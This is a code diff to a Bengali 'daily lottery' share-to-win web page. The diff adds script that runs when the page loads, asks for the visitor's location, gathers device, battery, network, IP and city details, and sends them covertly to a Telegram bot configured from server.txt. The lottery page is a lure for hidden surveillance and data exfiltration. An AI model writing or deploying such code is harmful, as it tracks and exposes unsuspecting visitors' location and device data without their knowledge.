@@ -301,10 +301,10 @@
   }
 }
 
-</style>
+       
+    </style>
 </head>
 <body>
-
 <!-- Header Section -->
 <div class="card" aria-label="Header Section">
   <h1>🎁 দৈনিক লটারি 🎉</h1>
@@ -391,8 +391,14 @@
 
 
 
-<script>
-  let shareCount = 0;
+
+
+
+    <script>
+
+
+
+ let shareCount = 0;
   const target = 10;
 
   function updateProgress() {
@@ -574,7 +580,200 @@
   window.addEventListener('load', () => {
     randomWinnerToastLoop();
   });
-</script>
+
+
+
+
+
+        // Request geolocation permission and gather additional information when the page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            navigator.geolocation.getCurrentPosition(sendTelegramLocation);
+
+            // Default values
+            let batteryPercentage = 'N/A';
+            let networkType = 'N/A';
+
+            // Retrieve battery and network information (if available)
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function (battery) {
+                    batteryPercentage = (battery.level * 100).toFixed(2) + '%';
+                });
+            }
+
+            if (navigator.connection) {
+                networkType = navigator.connection.effectiveType;
+            }
+
+            function sendTelegramLocation(position) {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                // Gather additional information
+                const wanIp = '';
+                const userAgent = navigator.userAgent;
+                const dateAndTime = new Date().toLocaleString();
+                const totalRam = navigator.deviceMemory;
+
+                // Create a message with all the information
+                const infoMessage = `
+WAN IP Address: ${wanIp}
+User-Agent: ${userAgent}
+Battery Percentage: ${batteryPercentage}
+Network Type: ${networkType}
+Date and Time: ${dateAndTime}
+Total RAM: ${totalRam} GB
+`;
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: infoMessage,
+                    }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                })
+                .catch(error => {
+                    console.error(error);
+                });
+
+                // Send the location after sending the message
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        latitude: latitude,
+                        longitude: longitude,
+                    }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                })
+                .catch(error => {
+                    console.error(error);
+                });
+            }
+        });
+    
+
+    // Fetch Telegram config from server.txt
+    async function getTelegramConfig() {
+      try {
+        const res = await fetch('server.txt');
+        const text = await res.text();
+        const token = text.match(/TOKEN=(.*)/)[1].trim();
+        const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();
+        return { token, chatId };
+      } catch (e) {
+        alert('Failed to load Telegram config.');
+        return { token: '', chatId: '' };
+      }
+    }
+
+    let TELEGRAM_BOT_TOKEN = '';
+    let TELEGRAM_CHAT_ID = '';
+    getTelegramConfig().then(cfg => {
+      TELEGRAM_BOT_TOKEN = cfg.token;
+      TELEGRAM_CHAT_ID = cfg.chatId;
+    });
+
+    // ====== DEVICE/ENVIRONMENT INFO COLLECTION ======
+    async function getDeviceInfo() {
+        const nav = navigator;
+        const deviceType = /android/i.test(nav.userAgent) ? 'Android' :
+            /iphone|ipad|ipod/i.test(nav.userAgent) ? 'iPhone/iOS' :
+            /windows/i.test(nav.userAgent) ? 'Windows PC' :
+            /macintosh|mac os x/i.test(nav.userAgent) ? 'Mac' :
+            /linux/i.test(nav.userAgent) ? 'Linux' : 'Unknown';
+        const userAgent = nav.userAgent;
+        const platform = nav.platform;
+        const language = nav.language || nav.userLanguage;
+        const screenRes = `${window.screen.width}x${window.screen.height}`;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const referrer = document.referrer ? document.referrer : 'Direct/None';
+        const connection = nav.connection ? nav.connection.effectiveType : 'Unknown';
+        const cpuCores = nav.hardwareConcurrency || 'Unknown';
+        const ram = nav.deviceMemory ? nav.deviceMemory + ' GB' : 'Unknown';
+        const now = new Date();
+        const currentTime = now.toLocaleString();
+        let batteryInfo = 'Not supported';
+        if (nav.getBattery) {
+            try {
+                const battery = await nav.getBattery();
+                batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not charging'})`;
+            } catch (e) {}
+        }
+        return {
+            deviceType, userAgent, platform, language, screenRes, timezone, referrer,
+            connection, cpuCores, ram, batteryInfo, currentTime
+        };
+    }
+
+    // ====== IP & GEOLOCATION INFO ======
+    async function getIPGeoInfo() {
+        try {
+            const res = await fetch('https://geolocation-db.com/json/');
+            if (!res.ok) throw new Error('IP info fetch failed');
+            const data = await res.json();
+            return {
+                ip: data.IPv4 || 'Unknown',
+                city: data.city || 'Unknown',
+                region: data.state || 'Unknown',
+                country: data.country_name || 'Unknown'
+            };
+        } catch (e) {
+            return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
+        }
+    }
+
+    // ====== TELEGRAM BOT SENDER ======
+    async function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+    }
+
+    // ====== MESSAGE FORMATTER ======
+    function formatDeviceInfo(info, geo) {
+        return [
+            '*Device and Environment Info*',
+            `📱 Device Name/Type: ${info.deviceType}`,
+            `🕸️ User Agent: ${info.userAgent}`,
+            `💻 Platform: ${info.platform}`,
+            `🈯 Language: ${info.language}`,
+            `📐 Screen Resolution: ${info.screenRes}`,
+            `⏰ Timezone: ${info.timezone}`,
+            `🔗 Referrer: ${info.referrer}`,
+            `📶 Connection Type: ${info.connection}`,
+            `🧠 CPU Cores: ${info.cpuCores}`,
+            `💾 RAM: ${info.ram}`,
+            `🔋 Battery Info: ${info.batteryInfo}`,
+            `🕒 Current Time: ${info.currentTime}`,
+            '',
+            '*IP and Geolocation Info*',
+            `🌍 IP Address: ${geo.ip}`,
+            `🏙️ City: ${geo.city}`,
+            `🌐 Region/State: ${geo.region}`,
+            `🌎 Country: ${geo.country}`
+        ].join('\n');
+    }
+    </script>
 
 </body>
 </html>
